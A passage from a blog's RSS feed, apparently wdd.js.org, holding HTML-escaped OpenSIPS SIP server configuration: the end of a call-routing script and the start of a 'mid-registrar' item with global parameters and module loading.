&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;405&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Method Not Allowed&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	do_accounting&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!is_myself&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$rd&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		append_hf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P-hint: outbound\r\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$rU&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;NULL&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;# request with no Username in RURI&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		sl_send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;484&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Address Incomplete&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# do lookup with method filtering&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!lookup&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;location&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;404&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not Found&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# when routing via usrloc, log the missed calls also&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	do_accounting&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;missed&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	route&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;relay&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# for INVITEs enable some additional helper routes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;is_method&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;INVITE&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_branch&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;per_branch_ops&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;handle_nat&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		t_on_failure&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;missed_call&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;!t_relay&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		send_reply&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;500&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Internal Error&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;branch_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;per_branch_ops&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;new branch at &lt;/span&gt;$ru&lt;span style=&#34;color:#e6db74&#34;&gt;\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;onreply_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;handle_nat&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	xlog&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;incoming reply\n&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;failure_route&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;missed_call&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;t_was_cancelled&lt;span style=&#34;color:#f92672&#34;&gt;())&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		exit;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# uncomment the following lines if you want to block client &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;# redirect based on 3xx replies.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##if (t_check_status(&amp;#34;3[0-9][0-9]&amp;#34;)) {&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##t_reply(&amp;#34;404&amp;#34;,&amp;#34;Not found&amp;#34;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##	exit;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;##}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>mid-registrar</title>
      <link>https://wdd.js.org/opensips/ch8/mid-register/</link>
      <pubDate>Tue, 02 Jul 2019 22:32:02 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch8/mid-register/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# $Id$&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# OpenSIPS residential configuration script&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#     by OpenSIPS Solutions &amp;lt;team@opensips-solutions.com&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# This script was generated via &amp;#34;make menuconfig&amp;#34;, from&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   the &amp;#34;Residential&amp;#34; scenario.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# You can enable / disable more features / functionalities by&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#   re-generating the scenario with different options.#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Please refer to the Core CookBook at:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#      http://www.opensips.org/Resources/DocsCookbooks&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# for a explanation of possible statements, functions and parameters.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Global Parameters #########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_level&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_stderror&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;yes
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;log_facility&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;LOG_LOCAL0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;children&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the following line to enable debugging */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#debug_mode=yes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the next line to enable the auto temporary blacklisting of 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   not available destinations &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default disabled&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#disable_dns_blacklist=no&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* uncomment the next line to enable IPv6 lookup after IPv4 dns 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   lookup failures &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default disabled&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#dns_try_ipv6=yes&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/* comment the next line to enable the auto discovery of local aliases
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   based on revers DNS on IPs */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;auto_aliases&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;listen&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;udp:10.0.0.3:5060   &lt;span style=&#34;color:#75715e&#34;&gt;# CUSTOMIZE ME&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####### Modules Section ########&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#set module path&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mpath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/lib/opensips/modules/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mid_registrar.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mid_registrar&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mode&amp;#34;&lt;/span&gt;, 2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; /* 0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mirror / 1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ct / 2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AoR */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mid_registrar&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;outgoing_expires&amp;#34;&lt;/span&gt;, 7200&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;modparam&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;mid_registrar&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;insertion_mode&amp;#34;&lt;/span&gt;, 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; /* 0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; contact; 1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; path */
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### SIGNALING module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;signaling.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### StateLess module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sl.so&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#### Transaction Module&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;loadmodule &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tm.so&amp;#34;&lt;/span&gt;
